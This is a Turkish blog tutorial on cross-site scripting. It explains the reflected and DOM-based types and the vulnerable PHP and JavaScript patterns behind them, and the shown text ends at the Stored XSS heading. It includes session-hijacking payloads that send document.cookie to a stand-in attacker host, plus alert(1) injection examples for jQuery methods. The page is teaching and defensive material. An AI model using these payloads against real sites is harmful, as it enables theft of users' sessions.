<!DOCTYPE html>
<html lang="en-US">
    <head>
        <meta charset="utf-8"> 
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="author" content="Musa ŞANA" />
        <meta name="copyright" content="Musa ŞANA" />

<meta name="keywords" content="xss, xss-döküman, xss-solution, xss-auditor, xss-payload, reflected, dom-based, stored, xss-zafiyeti, session-hijacking, web-for-pentester-solution, xss-saldırısı, Security, " />
        <title>Cross Site Scripting  · musana.net
</title>
        <link href="/theme/css/slim-081711.css" rel="stylesheet" type="text/css">
        <link href="/theme/css/bootstrap-combined.min.css" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="http://musana.net/theme/css/style.css" media="screen">
        <link rel="stylesheet" type="text/css" href="http://musana.net/theme/css/solarizedlight.css" media="screen">
        <link rel="shortcut icon" href="http://musana.net/theme/images/favicon.ico" type="image/x-icon" />
        <link rel="apple-touch-icon" href="http://musana.net/theme/images/apple-touch-icon.png" />
        <link rel="apple-touch-icon" sizes="57x57" href="http://musana.net/theme/images/apple-touch-icon-57x57.png" />
        <link rel="apple-touch-icon" sizes="72x72" href="http://musana.net/theme/images/apple-touch-icon-72x72.png" />
        <link rel="apple-touch-icon" sizes="114x114" href="http://musana.net/theme/images/apple-touch-icon-114x114.png" />
        <link rel="apple-touch-icon" sizes="144x144" href="http://musana.net/theme/images/apple-touch-icon-144x144.png" />
        <link rel="icon" href="http://musana.net/theme/images/apple-touch-icon-144x144.png" />
	<link href='https://fonts.googleapis.com/css?family=Source+Sans+Pro' rel='stylesheet' type='text/css'>
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300" rel="stylesheet"> 
        <link rel="stylesheet" type="text/css"  href="http://musana.net/theme/css/custom.css" media="screen" />
    </head>
    <body>
        <div id="content-sans-footer">
        <div class="navbar navbar-static-top">
            <div class="navbar-inner">
                <div class="container">
                    <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </a>
                    <a class="brand" id="musana" href="http://musana.net/"><span class=site-name>musana.net</span></a>
                    <div class="nav-collapse collapse">
                        <ul class="nav pull-right top-menu">
                            <li ><a href="http://musana.net/">Anasayfa</a></li>
                            <li ><a href="http://musana.net/categories.html">Kategori</a></li>
                            <li ><a href="http://musana.net/tags.html">Etiket</a></li>
                            <li ><a href="http://musana.net/archives.html">Arşiv</a></li>
                            <li><form class="navbar-search" action="http://musana.net/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Ara..." name="q" id="tipue_search_input"></form></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="container-fluid">
            <div class="row-fluid">
                <!-- <div class="span1"></div> disabled for toc-->
                <div class="span12">
<article>
<a id="page-top" href="#musana" style="display:block">↑</a>
<div class="row-fluid">
    <div class="span2"></div>
    <header class="page_header span8">
    <h1><a href="http://musana.net/yazilar/2016/xss-detayli-dokuman.html"> Cross Site Scripting  </a></h1>
    </header>
</div>

<div class="row-fluid">

    
    <div class="span2 icindekiler table-of-content">
        <nav>
        <h4>İçindekiler</h4>
        <div class="toc">
<ul>
<li><a href="#baslamadan-once">Başlamadan Önce;</a></li>
<li><a href="#xss-cross-site-scripting-css">XSS (Cross Site Scripting, CSS)</a><ul>
<li><a href="#xss-ile-neler-yaplabilir">XSS ile neler yapılabilir ?</a><ul>
<li><a href="#a-html-ile">a) Html ile;</a></li>
<li><a href="#b-javascript-ile">b) JavaScript ile;</a></li>
</ul>
</li>
<li><a href="#zafiyet-neyden-kaynaklanmakta">Zafiyet neyden kaynaklanmakta?</a></li>
<li><a href="#xss-turleri">XSS Türleri</a><ul>
<li><a href="#reflected-xss">Reflected XSS</a></li>
<li><a href="#dom-based-xss">DOM Based XSS</a></li>
<li><a href="#storedpersistent-xss">Stored(Persistent) XSS</a></li>
</ul>
</li>
<li><a href="#xss-zafiyetinin-cozumu">XSS Zafiyetinin Çözümü</a><ul>
<li><a href="#girdi-kontrolleri">Girdi Kontrolleri</a><ul>
<li><a href="#white-list-teknigi">White List Tekniği</a></li>
<li><a href="#black-list-teknigi">Black List Tekniği</a></li>
<li><a href="#sanitize">Sanitize</a></li>
<li><a href="#encoding">Encoding</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#web-for-pentester">Web for Pentester</a><ul>
<li><a href="#example-1">Example 1</a></li>
<li><a href="#example-2">Example 2</a></li>
<li><a href="#example-3">Example 3</a></li>
<li><a href="#example-4">Example 4</a></li>
<li><a href="#example-5">Example 5</a></li>
<li><a href="#example-6">Example 6</a></li>
<li><a href="#example7">Example7</a></li>
<li><a href="#bonussiz-cozun">BONUS(Siz Çözün):</a></li>
</ul>
</li>
<li><a href="#ornek-bir-senaryo">Örnek bir senaryo</a></li>
<li><a href="#son-soz">SON SÖZ</a></li>
</ul>
</div>
        </nav>
    </div>

    <div class="span10 article-content">

            
<h4 id="baslamadan-once"><strong>Başlamadan Önce;</strong></h4>
<p>Her geçen yıl bu etkinliğe artan başvuru ve ilgiyi göz önüne alarak böyle bir etkinliğin organize edilip yönetilmesinin çok zor bir iş olduğunu daha işin başında söylemek isterim. Öte taraftan eğitimin tamamıyla gönüllü temelli olması işin bir başka güzel tarafı ama aynı zamanda zor tarafı da. Eğitimde görevli olan herkesin kendi zamanlarından fedakarlık göstererek bu kampı sorunsuz bir şekilde gerçekleştirmek için büyük çaba sarf ettikleri aşikar. Bu sebeble başta web güvenliği eğitmenlerden <code>Ömer ÇITAK</code>, <code>Mehmet Dursun İNCE</code> ve <code>Murat YILMAZLAR</code> olmak üzere bu etkinlikte emeği geçen her kişiye ayrı ayrı can-ı gönülden teşekkürlerimi sunarım.</p>
<p>Bu bağlamda bende kendimce işin bi’ ucundan tutup biraz kendimden, biraz eğitimde anlatılanları elimden geldiğince aktaracağım. Bazı yerlerde fazla detaya gireceğim bazı yerlerde bir cümle ile yetineceğim ancak amaç; elimden geldiği kadar lyk’da öğretilenleri sizlere aktarmak olacaktır. Özgür yazılım, özgür doküman, özgür bilgi!</p>
<blockquote>
<p>Bu yazının kamptan bir kaç gün sonra yayınlanması gerekiyordu ancak benden kaynaklanan sorunlar yüzünden şimdi yayınlayabildim. Bu sebebten ötürü yazının yayınlanmasını bekleyenleri beklettiğim için özür dilerim :)  </p>
</blockquote>
<p>Bu yazı 3 ana bölümden oluşmaktadır.</p>
<ul>
<li>
<p>İlk bölümde XSS hakkındaki teorik bilgiler anlatılmıştır.  </p>
<ul>
<li>XSS nedir?</li>
<li>XSS zafiyeti ile neler yapılabilir?</li>
<li>XSS zafiyetine sebeb veren durum nedir?</li>
<li>XSS zafiyetini nasıl tespit ederiz?</li>
<li>XSS zafiyetinin türleri nelerdir?</li>
</ul>
</li>
<li>
<p>İkinci bölümde, birinci bölümde anlatılan tüm teorik bilgiler lab ortamında pratiğe dökülmüştür. </p>
</li>
<li>
<p>Son bölümde ise günlük hayatta karşımıza çıkabilecek örnek bir senaryo, video ile desteklenerek anlatılmıştır. </p>
</li>
</ul>
<h2 id="xss-cross-site-scripting-css"><strong>XSS (Cross Site Scripting, CSS)</strong></h2>
<p><font color="#121ab4">XSS (Siteler arası betik çalıştırma) zafiyeti, saldırganın html, css, javascript ile hazırlamış olduğu zararlı kod parçalarının hedef kullanıcının(kurbanın) browserında izinsiz olarak çalıştırmasına imkan tanıyan bir web uygulama güvenliği zafiyetidir.</font> Başka bir deyişle; bir uygulamada bulunan XSS zafiyeti saldırgana, hedef kullanıcının tarayıcısında zararlı kod çalıştırma imkanı tanır. Bu imkan neticesinde saldırgan, hedef kullanıcının oturum bilgilerini, ekran görüntüsünü, tuş girişleri gibi bilgileri alabilir, uygulama içeriğinin manüpüle edebilir. Bu zafiyet istismar edilirken bazen kurbanın insiyatifine bağlı olurken(Reflected ve DOM based türlerinde) bazen de saldırgan, kurban ile muhattap olmadan da zafiyetten etkilenmesini sağlayabilir(persistent türünde).</p>
<h3 id="xss-ile-neler-yaplabilir"><strong>XSS ile neler yapılabilir ?</strong></h3>
<h4 id="a-html-ile"><strong>a) Html ile;</strong></h4>
<ul>
<li>Html kodlar kullanılarak fake inputlar yerleştirilip veri çalınabilir.  </li>
<li>Iframe etiketi kullanılarak başka sayfalar çağrılıp veri alınabilir.  </li>
<li>Html meta refresh ile sayfa yönlendirelebilir.   </li>
<li>Özetle içeriği html  ve css kullanarak istediğiniz gibi manipüle edebilirsiniz.  </li>
</ul>
<p><i style="font-size:0.8em">Asıl saldırı vektörleri javascript kodu kullanarak gerçekleştirilmektedir. Çünkü javascript ile daha dinamik işlemler yapabilmektedir.</i></p>
<h4 id="b-javascript-ile"><strong>b) JavaScript ile;</strong></h4>
<ul>
<li>En bilinen ve yaygın olan document.cookie ile kullanıcıların oturum bilgilerini almak.(Session Hijacking)</li>
<li>Ajax ile kullanıcı bilgilerinin alınıp uzak sunucudaki bir dosyada kayıt edilmesi.</li>
<li><code>addEventListener</code> fonksiyonu ile hedef kullanıcının bütün klavye, mouse, form etkileşimleri vs kayıt altına alınarak saldırganın kontrolunda olan bir uzak sunucuya gönderilebilir.</li>
<li>Bulunan sistemlere bağlı olarak (camera hizmeti olan sistemlerde) kişinin kamerasından anlık ekran görüntüsü alınabilir.</li>
<li><code>XMLHttpRequest</code> nesnesi ile istenilen bir adrese istek yapılabilir.</li>
<li>DOM sayesinde JS ile sayfa içeriği rahatlıkla değiştirilebilir. Örneğin bir form tagının action niteliğinin değeri değiştirilip kullanıcının form inputlarına girdiği (username,password, kredi kartı vs) hasas bilgileri alınabilir.(Phishing)</li>
<li>Botnet ağı kurulabilir.</li>
<li>Kısaca javascript kodu ile yapabileceğiniz her türlü işlemleri yapabilirsiniz. Bu artık üretkenliğinize kalan bir durumdur.  </li>
</ul>
<hr/>
<div class="highlight"><pre><span></span>Beef framework tarayıcı odaklı bir penetrasyon test aracıdır. Bünyesindeki bir çok exploit ile tarayıcıya yönelik ciddi saldırılar gerçekleştirebilir.  
XSS saldırısı da client side bir saldırı olduğu için bu zafiyet istismar edilirken bazen bu tool kullanılır. Çünkü saldırgana işi daha fonksiyonel, otomatize ve rahat bir şekilde kontrol edebilme avantajı sağlamaktadır.   
</pre></div>
<p><br/></p>
<h3 id="zafiyet-neyden-kaynaklanmakta"><strong>Zafiyet neyden kaynaklanmakta?</strong></h3>
<p><font color="#121ab4">XSS saldırıların en temel nedeni kullanıcılardan alınan inputların hiçbir filtrelemeden geçmeden işleme tabi tutulmasıdır.</font>Bu inputlar;  </p>
<ul>
<li>kullanıcıdan form elemanları aracılığıyla alınan bir değer olabilir(search, login, register etc.), </li>
<li>get metoduyla gönderilen bir değer olabilir,</li>
<li>http headerlerı ile gönderilen bir değer olabilir, </li>
<li>cookie, session id değerleri olabilir,</li>
<li>bir file upload kısmında dosyanın kendisi veya dosyanın adı olabilir.</li>
<li>...    </li>
</ul>
<p>Özetle; kullanıcıdan sunucuya giden herhangi bir verinin bir filtreleme işlemine tabi tutulmadan doğrudan kullanılmasından kaynaklanır. Karşıdaki her zaman sıradan bir son kullanıcı olmayabilir. Bu hiçbir zaman göz ardı edilmemelidir. Geliştirilen her uygulama için kullanıcıları saldırgan olarak düşünüp uygulamayı o yönde geliştirmek gerekir.<br/>
Basit bir kod;  </p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
<span class="cp">?&gt;</span>
</pre></div>
<p>En kısa anlatımla yukarıdaki kod id parametresinin aldığı değeri ekrana basıyor. Ne güzel :)
Peki son kullanıcı sıradan değer değilde; html, javascript gibi istemci tarafından çalışan dillerin keywordlerini(veya server side kısmında çalışan diller için özel anlamı olan karakterleri) kullanınca ne olacak? Hiçbir filtreleme işlemi yapılmadığı için tabi ki de paşa paşa çalışacaktır. Çünkü ilgili değerler kaynak kodun syntaxını bozmadığı için düzgün bir şekilde çalışacaktır. Yani kullanıcı <code>cmd</code> parametresine <code>&lt;b&gt;merhaba&lt;/b&gt;</code> değerini yazdığında ekranda bold olarak merhaba yazacaktır. Bu bizim için şunu ifade eder. Html ve JS kullanarak istediğimiz gibi at koşturabiliriz. Ayrıca yukarıdaki kod sadece xss zafiyetine yol açmamaktadır. Eğer cmd parametresindeki değer veritabanına kayıt edilip tekrar yazdırılırsa bu <code>sql injection</code> zafiyetine de sebeb verecektir. İşte kullanıcıdan alınan en ufak bir verinin kontrolu bu kadar önemli!<br/>
<br/></p>
<h3 id="xss-turleri"><strong>XSS Türleri</strong></h3>
<p>XSS saldırısında amaç; hedef kullanıcının tarayıcısında bir şekilde zararlı kod çalışmaktır. Bu amaca ulaşmak için bir kaç farklı yöntem bulunmaktadır. Bu farklılıktan dolayı xss saldırıları şimdilik 3 türe ayrılmıştır. Bizde bu sınıflandırmaya sadık kalarak konuyu anlatacağız.  </p>
<h4 id="reflected-xss"><strong>Reflected XSS</strong></h4>
<p>Reflected XSS saldırısında; kurbanın, hedef siteye istek yapması için kullanacağı bağlantıda(link) zararlı kod parçası bulundurmasıdır. İstek yapılırken bu zararlı kod ifa edilir ve dönen cevap saldırganın saldırganın kontrolunde olan bir uzak sunucuya gönderilir. Burada önemli olan nokta; zafiyetin istismar edilmesi tamamen kullanıcının insiyatifine kalan bir durumdur. Yani kullanıcı zararlı kod içeren bağlantıya tıklamadığı sürece zafiyetten etkilenmeyecektir. Ayrıca diğer türlerine oranla en çok karşılaşılan xss saldırı türüdür.<br/>
GET metoduyla alınan bir <code>q</code> parametresinde reflected xss zafiyeti olan bir sistem tassavur edelim. Yani şöyle;<br/>
<code>http://zafiyetlisite.com?q=</code><br/>
Saldırgan böyle bir senaryo karşısında aşağıdakine benzer bir payload kullanacaktır.   </p>
<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"sazan"</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">"http://saldirgan.com?snif.php?q="</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</pre></div>
<p><em>Kodun meali;</em><br/>
Yukarıdaki zararlı kod; sayfada id seçicisinin adı <code>sazan</code> olan bir elementi seçiyor(bu elementin <code>&lt;img /&gt;</code> olduğunu kabul edelim). Ve <code>src</code> niteliğine, saldırganın kontrolunda olan bir hostun adresini atıyor. Bu hostta bulunan sniff.php dosyasına, q paremetresinde kurbanın cookie değeri olacak şekilde get metoduyla bir istekte bulunuyor. Saldırgan da gelen bu isteği kayıt altına alıyor ve böylece hedef kullanıcının oturum bilgisini kendi oturum bilgisi ile değiştirerek giriş yapıyor.(Örnek senaryoda bunun nasıl yapıldığını göreceğiz.)  </p>
<p>Yani sonuç olarak saldırgan aşağıda bulunan bağlantıyı bir şekilde kurbana tıklatmak zorundadır. Daha doğru bir şekilde ifade edersek; saldırganın, kurbana aşağıdaki bağlantıya istek yapmasını sağlaması gerekir. İlla tıklaması gerekmez. Kendi kontrolunda olan başka bir site üzerinde bulunan src niteliğine sahip bir elemente aşağıdaki bağlantıyı gömmesi yeterlidir. Kurbanın ruhu bile duymaz. Daha derin düşününce aklıma daha kötü şeyler gelmiyor değil. Neyse :)  </p>
<div class="highlight"><pre><span></span>http://zafiyetlisite.com?q=<span class="nt">&lt;script&gt;</span>document.getElementById("sazan").src = "http://saldirgan.com?snif.php?q="+document.cookie<span class="nt">&lt;/script&gt;</span>
</pre></div>
<p>Ancak... we have a bit of problem. Kim böyle bir bağlantıya tıklar? Sazan olmayan biri olursa böyle bir bağlantıdan işkilenip tıklamayacaktır. Bu tür durumlarda saldırgan link kısaltma servislerini kullanmaktadır. O yüzden her gördüğünüze tıklamayın :) Bazı eklentiler sayesinde kısaltılan linklere tıklamadan da açık halini de görmek mümkündür. Aklınızda olsun.<br/>
Öte taraftan saldırganın kullanacağı payloadlar sadece bununla sınırlı değil. Örneğin aşağıdaki gibi bir payload ile de saldırgan amacına rahatlıkla ulaşabilir. </p>
<div class="highlight"><pre><span></span>http://zafiyetlisite.com?q=<span class="nt">&lt;script&gt;</span>document.location.href("http://saldirgan.com?snif.php?q="+document.cookie)<span class="nt">&lt;/script&gt;</span>
</pre></div>
<p>Saldırgan, kurbana yukarıdaki bağlantıya istek yapmayı başardığında <code>document.location.href</code> fonksiyonundan dolayı kullanıcı saldırganın belirtiği adrese yönlendirilecektir bu da saldırganın istemediği bir durumdur. Saldırılar daha çok kurbana sezdirmeden yapılmaktır. Bu nedenle ilk payloadımız veya ona benzer payloadlar daha çok tercih edilmektedir. Dediğim gibi payloadlar bunlardan ibaret değil saldırganın amacına ulaşması için birçok farklı payload çeşidi vardır. Ancak hepsinin tek bir amacı vardır;</p>
<div class="highlight"><pre><span></span>Önemli olan kurbana ilgili requesti yapmayı başarmaktır. Ne şekilde olacağının bir önemi yok, ama kurbana sezdirmeden yapılması tabi ki daha makbuldur.
</pre></div>
<p>Son olarak bu anlatıklarımızı örnek bir diyagram üzerinde görürsek konunun tam anlaşılmasına faydası olacaktır.
<img alt="reflected-xss" src="/img/reflected-xss.png"/></p>
<ol>
<li>Saldırgan site üzerinde bulduğu reflected xss zafiyetini kullanarak başka kullanıcıların oturum bilgisini çalmak için zararlı linki kurbana gönderir.</li>
<li>Kurban bağlantıya tıklar ve ilgili siteye gider.</li>
<li>Ama aynı zamanda bağlantıda bulunan zararlı kod da ifa edilir ve web sitesinden kurbanın cookie bilgileri istenir ve dönen cevap kurbana iletilir.</li>
<li>Gelen cevapta kurbanın cookie bilgileri bulunur ve zararlı olan js kodu cookie bilgilerini saldırganın serverına gönderecek olan kodu işler.  </li>
</ol>
<p><br/></p>
<h4 id="dom-based-xss"><strong>DOM Based XSS</strong></h4>
<p><code>type-0 xss</code> olarak da bilinen bu xss türü, client side olup diğer iki türün(persistent ve reflected) aksine çok farklı bir mekanizmaya sahiptir. DOM tabanlı xss zafiyetine geçmeden önce basitçe DOM yapısının ne olduğundan bahsetmemizde fayda var.</p>
<div class="highlight"><pre><span></span>DOM (Document Object Model), w3c organizasyonu tarafından tanımlanan bir standartır. Temel amacı bir belge içerisindeki yapıyı object-oriented paradigmasına dönüştürmektir. Sadece html yapısına özgü olmamakla beraber herhangi bir belge de dom yapısına sahip olabilir. En çok duyduklanlar arasında XML ve HTML dom yapısı gelmektedir. Biz ise burada HTML DOM yapısını ele alacağız.  
HTML DOM, platformdan bağımsız olarak diğer dillerin html ile etkileşime geçerek bilgi alışverişinde bulunabilmesine imkan tanıyan bir arabirimdir. Bu yapıya göre bir html belgesindeki bütün etiketler (hiyerarşik bir düzene göre) nesne olarak kabul edilip bu nesnelere erişilerek içeriği veya özellikleri değiştirilebilmektedir.
</pre></div>
<p>Başta söylediğimiz üzere yapısı gereği diğer iki türden farklıdır. Çünkü persistent ve reflected xss zafiyetleri sunucu taraflı filtrelemeler ile engellenebilirken DOM tabanlı xss de böyle bir durum söz konusu değildir. Bunun nedeni ise; bazı sorguların sonucuya iletilmeden kullanıcının browserında çalışması veya sunucudan cevap döndükten sonra sorgunun ifa edilmesiden kaynaklanmaktadır. Örneğin, url'de bulunan <code>#</code> (diez, hash,fragment) karakterinden sonraki ifade sunucuya iletilmez. Yani <code>#</code> den sonraki ifadeler için herhangi bir http trafiği oluşmaz. <code>#</code> ifadesi sayfa içerisinde bir bölüme geçiş yapmanın yanında farklı amaçlar içinde kullanılmaktadır. Size verebileceğim en iyi örnek şu an bu sayfanın sol üst tarafında bulunan içerikler kısmı olacaktır :) İlgili bağlantıya tıkladığınızda sayfa içerisinde ilgili bölüme gelmektesiniz ve url yapısında da <code>#</code> ifadesinden sonra geldiğiniz kısmın id değeri yazmaktadır. Peki <code>#</code> karakterinden sonraki kısmın sunucuya iletilmemesi iyi bir olay mı?</p>
<p>Bir saldırganın gözünden bakarsak kesinlikle çok iyi bir olay. Url'deki ifadenin bir kısmının sunucuya iletilmeden tarayıcı tarafından icra edilmesi tam olarak şu anlama gelmektedir: Sunucu tarafındaki alınan hiçbir güvenlik işe yaramayacaktır. Çünkü zararlı kod <code>#</code> ifadesinden sonra yazıldığı için sunucuya iletilmiyor ancak sunucudan kullanıcıya cevap döndükten sonra <code>#</code> ifadesinden sonraki kod tarayıcı tarafından ifa edilecek ve zafiyet bu şekilde istismar edilmiş olacak.</p>
<div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">'#'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
</pre></div>
<p>Yukarıdaki JS kodu; Url içerisinde bulunan <code>#</code> karakter(ler)ini referans alarak url adresini parçalar ve oluşan değerleri bir dizi içerisinde tutar. Oluşan dizideki 2. elemanı(veya indisi 1 olan elemanı) x değişkenine atar ve bu değişkeni <code>document.write</code> ile ekrana basar.<br/>
Eğer geliştirici web uygulamasının bir yerlerinde böyle bir kod kullanmış ise saldırganın bunu keşfetmesi durumunda geliştireceği payload gayet basittir.<br/>
<code>http://site.com#&lt;script&gt;alert(1)&lt;/script&gt;</code> <br/>
Saldırgan yukarıdaki payloadı kullanarak kurbana istek yapmaya çalıştığında <code>#</code> karakterinden sonraki değer sunucuya iletilmeyeceğinden, sunucu tarafında alınmış çok ciddi filtreleme, sanitize, encoding, white list vs. işlemleri olsa bile bu durum dom-based xss zafiyetini engelleyemeyecektir. Çünkü sunucuya <code>#</code> karakterinden sonraki ifade gönderilmeyecektir. <code>#</code> karakterinden önceki istek sunucuya yapılır ve sunucudan cevap döndükten sonra <code>#</code> karakterinden sonraki kod kullanıcının browserı tarafından ifa edilir. Bu saldırı vektörü client side bir yapıya sahip olduğundan dolayı browser geliştiricileri bu durumu çözmek için tarayıcının kendi içinde güvenliği sağlamaya çalışmışlardır. Yukarıdaki js kodunu çalıştırıp payloadı denediğinizde alert alamayabilirsiniz. Çünkü Chrome, <code>XSS Auditor</code> diye adlandırdığı, kullanıcıyı xss saldırılarından korumak için bir güvenlik sağlamış, firefox ise encoding işlemine tabi tutacağından payload çalışmayacaktır. </p>
<div class="highlight"><pre><span></span>Chrome bir çok xss payloadını güvenlik nedeniyle engellemektedir. Bu yazının ikinci ana bölümünde anlatığım testleri denerken chrome kullanırsanız büyük ihtimalle örneklerin çoğunda alert alamayacaksınız.(Firefox kullanın.) Bu nedenle xss zafiyeti ararken chromeda (veya başka bir tarayıcıda olabilir) hata almamanız xss zafiyetinin olmadığı anlamına gelmemektedir. Çünkü her tarayıcı bazı standartlara uymayıp kendi standartlarını oluşturmaya/dayatmaya çalıştıklarından dolayı aynı kodlar farklı tarayıcılarda farklı sonuçlar verebilmektedir. Tarayıcıdan tarayıcıya farklı sonuçlar almanız sizi şaşırtmasın yani. Özellikle front-end geliştiricileri bu durumu çok iyi bilmektedir. Buna binaen xss zafiyeti ararken aynı payloadı farklı tarayıcılarda denemekte fayda var.
</pre></div>
<p><img alt="firefox-encoding" src="/img/firefox-encoding.png"/><br/>
Öte taraftan dom based xss client side bir saldırı olduğundan diğer tarayıcılar gibi firefoxda kullanıcılarının bu zafiyetten etkillenmeleri için encoding işlemi yapmaktadır. Mesela firefox <code>#</code> karakterinden sonraki ifadeyi encoding işleminden geçirdiği için yukarıdaki payloadımız firefoxda da çalışmayacaktadır. Firefox, diğer xss türlerinde chrome gibi herhangi bir engelleme yapmamaktadır. Chrome veya firefox'un eski sürümlerinde bu temel payloadlar çalışmaktadır. Kim güncel olmayan bir tarayıcı kullanır ki diyebilirsiniz. Bunlar temel payloadlar olduğu için sezgisel olarak chrome engelleyebiliyor ancak chrome'un yakalayamadığı çok complex payloadlar bulunmaktadır. Ayrıca chrome da bulunan XSS Auditor bypass edilebilmektir.</p>
<blockquote>
<p>Bu yazının yayınlanması yeterince geciktiğinden XSS Auditor'un nasıl çalıştığını ve nasıl bypass edileceğini başka bir yazıda ele alacağım İnşallah.</p>
</blockquote>
<p><img alt="dom-based-xss" src="/img/dom-based-xss-chrome.png"/><br/>
Yukarıdaki resim bize bazı noktalarda önemli bilgiler vermketedir. Öncellikle sayfanın kaynak koduna baktığınızda payloadımızın görünmediğini göreceksiniz. DOM based xss zafiyetinde payload sayfanın kaynak kodunda görünmez. Ancak geliştirici araçlarından bakarsanız görebilirsiniz. Yukarıda görmüş olduğunuz üzere geliştirici araçlarından baktığımızda kırmızı olarak görülen bölümde, xss.html dosyasının 12. satırında yer alan kodun tehlike arz etmesinden dolayı <code>XSS Auditor</code>un scriptte yer alan ilgili kodu çalıştırmadığını söylüyor. Google xss zafiyetinin sebeb olacağı tehlikeleri göz ardı etmediğinden kullanıcılarını bu tehtitten korumak için böyle bir güvenlik önlemi almış. Bizi bizden daha çok düşünüyorlar. Eksik olmasınlar(!)
Kullanırken dikkat edilmediği taktirde dom-based xss zafiyetine sebeb veren js fonksiyonu yukarıda verdiğimiz <code>document.location.hash.split</code> den ibaret değildir. Aşağıdaki js kodu da pek ala dom-based xss zafiyetine sebeb olmaktadır.  </p>
<div class="highlight"><pre><span></span>  <span class="kd">var</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">"Hello "</span><span class="o">+</span><span class="nx">name</span><span class="p">);</span>    
</pre></div>
<p>Bu zafiyetin birde jquery boyutu var tabi. JQueryde seçiciler(Selectors); bir html dökümanındaki etiketleri, <code>id</code>leri, <code>class</code>ları seçmek için kullanılan bir yapıdır. Bunun bizi ilgilendiren tarafı ise; seçiciler ile seçtiğiniz bir id, class veya html etiketine bazı metotlar kullanarak dinamik bir şekilde ekleme yapabilmemizdir. Aşağıdaki listede kullanırken çok dikkat etmemiz gereken jquery metodları payloadlarıyla beraber verilmiştir.(<code>sazan</code> adlı bir id değerimizin olduğu varsayılmıştır.)</p>
<div class="highlight"><pre><span></span><span class="nx">$</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">).</span><span class="nx">appendTo</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">);</span>

<span class="nx">$</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">).</span><span class="nx">prependTo</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">);</span>

<span class="nx">$</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">).</span><span class="nx">after</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">);</span>

<span class="nx">$</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">).</span><span class="nx">before</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">);</span>

<span class="nx">$</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">).</span><span class="nx">prepend</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">);</span> 

<span class="nx">$</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">);</span>

<span class="nx">$</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">).</span><span class="nx">append</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">);</span>
</pre></div>
<p>Defalarca dedik yine diyelim; Kullanıcının müdahale edebileceği yerlere veya kullanıcıdan değer aldığınız yerlere çok ama çok dikkat ediniz!</p>
<p>Bu yapının da net anlaşılması adına diyagram üzerinde gösterelim.(Diyagramlar genelde konu başında verilir ama neden ben konu sonunda veriyorum bilmiyorum.)</p>
<p><img alt="dom-based-xss" src="/img/dom-based-xss.png"/> </p>
<ol>
<li>Saldırgan hedef sistemdeki dom-based xss zafiyetini kullanarak oturum bilgisini çalmak istediği kullanıcıya payloadı ile beraber linki gönderir.</li>
<li>Kullanıcı(victim) bağlantıya tıklayıp zafiyetli siteye girer.</li>
<li>Zafiyetli site kullanıcıya normal bir cevap döner ancak site; kendisini ziyaret eden kullanıcıların yaptığı sorguyu js ile ekrana yazmaktadır.<br/>
(Payload henüz execute edilmemiştir.)</li>
<li>Zafiyetli siteden cevap döndükten sonra saldırganın sorgu parametresine yazdığı payload kurbanın tarayıcısı tarafından ifa edilir.</li>
<li>Kurbanın oturum bilgileri saldırganın sunucusuna gönderilir.</li>
</ol>
<p><br> </br></p>
<h4 id="storedpersistent-xss"><strong>Stored(Persistent) XSS</strong></h4>
